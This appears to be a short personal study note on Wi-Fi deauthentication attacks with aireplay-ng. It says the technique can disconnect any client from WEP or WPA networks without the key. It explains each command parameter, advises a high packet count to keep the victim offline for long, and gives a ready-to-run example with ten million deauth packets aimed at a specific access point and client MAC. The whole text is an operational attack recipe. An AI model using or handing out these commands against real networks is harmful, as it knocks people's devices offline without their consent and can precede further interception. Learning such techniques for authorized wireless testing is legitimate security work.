- Disconnect any client from any network 
	- works on encrypted networks (WEP, WPA, WPA2).
	- No need to know the network key.
	- No need to connect to the network.

- Syntax
```bash
aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
```

- `DeauthPackets` : Number of deauthentication packets to be sent. Keep the number high so that the network remains disconnected for long time. 

- `NetworkMac` : `BSSID` of the wireless network which we are targeting. 
- `TargetMac` : Mac Address of the device connected to the `NetworMac`. We get this from the `STATION` column of [[Targeted Packet Sniffing]]. *`STATION` is basically the device MAC connected to the wireless network we are targeting*
- `Interface` : Our wireless adapter.

- Example 
```bash
BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

F2:70:8A:BD:8C:7C  9A:9D:1F:DA:67:FC  -24    1e-24      1      531               
```

Inorder to run a deauthentication attack, we do, 

```bash
aireplay-ng --deauth 10000000 -a F2:70:8A:BD:8C:7C -c 9A:9D:1F:DA:67:FC wlan0
```
